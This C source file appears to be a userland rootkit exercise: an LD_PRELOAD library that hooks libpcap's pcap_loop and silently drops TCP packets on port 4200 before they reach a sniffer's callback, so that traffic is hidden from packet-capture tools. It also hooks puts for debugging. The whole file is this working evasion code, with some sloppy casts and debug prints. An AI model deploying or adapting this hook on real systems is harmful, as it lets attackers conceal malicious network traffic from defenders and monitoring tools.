#define _GNU_SOURCE // For RTLD_NEXT
#include <stdio.h>
#include <dlfcn.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pcap.h>
#include <sys/time.h>
#include <time.h>
#include <linux/tcp.h>
#include <linux/ip.h>
#include <linux/if_ether.h>

#define ETHERTYPE_IP 0x0800

int mystery_tcp_port = 4200; // Port number we wish to hide
pcap_handler original_callback;

void got_packet(u_char *args, const struct pcap_pkthdr *pkthdr, const u_char *packet) {
	/* This function is the callback function that used by pcap_loop before the original callback */

    struct ethhdr *eptr;
	eptr = (struct ethhdr*)packet;
	struct in_addr saddr,daddr;
    
    // If not eth proto
	if((ntohs(eptr->h_proto) !=ETHERTYPE_IP)) {
		return;
	}
	struct iphdr *p_iphdr;
	p_iphdr = (struct iphdr *)(packet + 14);
	char *src=NULL,*dest=NULL;
	saddr.s_addr = p_iphdr->saddr;
	src = inet_ntoa(saddr);
	daddr.s_addr = p_iphdr->daddr;
	dest = inet_ntoa(daddr);
	
    // if tcp
	if(p_iphdr->protocol==6) {
		struct tcphdr *p_tcphdr;
		p_tcphdr = (struct tcphdr *)(packet + 14 + 20);
        int sport = ntohs(p_tcphdr->source);
        int dport = (char*)ntohs(p_tcphdr->dest);

        // If src or dest is equal to the mystery port number
        if (dport == mystery_tcp_port || sport == mystery_tcp_port){
            printf("\nBudim's mysterious port used!!\n");
            printf("TCP: src port:%d dest port:%d\n",ntohs(p_tcphdr->source),(char*)ntohs(p_tcphdr->dest));
            printf("src ip:%s  dest ip:%s\n",src, dest);
            return ;
        } else {
            // If we dont want to hide the packet, call the original callback that was defiened by sniffer coder
            if (original_callback){
                original_callback(args, pkthdr, packet);
                printf("\nDebug: called original_callback\n");
            }
        }
    } else{
        // If we dont want to hide the packet, call the original callback that was defiened by sniffer coder
        if (original_callback){
            original_callback(args, pkthdr, packet);
            printf("\nDebug: called original_callback\n");
        }
    }
}

int pcap_loop(pcap_t *p, int cnt, pcap_handler callback, u_char *user) {
	/* This function is the override function that hook the original pcap_loop*/
    
    printf("Deubg: pcap_loop hooked.\n");
    original_callback = callback; // Save original callback func for later use
    int (*new_pcap_loop)(pcap_t *p, int cnt, pcap_handler callback, u_char *user);  // Declare new function that has the same properties of pcap_loop
    new_pcap_loop = dlsym(RTLD_NEXT, "pcap_loop"); // Find the next symbol that points to the original pcap_loop and set new_pcap_loop to point on this symbol
    new_pcap_loop(p, cnt, got_packet, user); // Call the original pcap_loop but instead of use original callback function, use got_packet()
    return 0;
}

int puts(const char *str) {
    // This function used to check that the hook succeeded for debug purpose

    printf("Hooked: %s\n", str);
    return 0;
}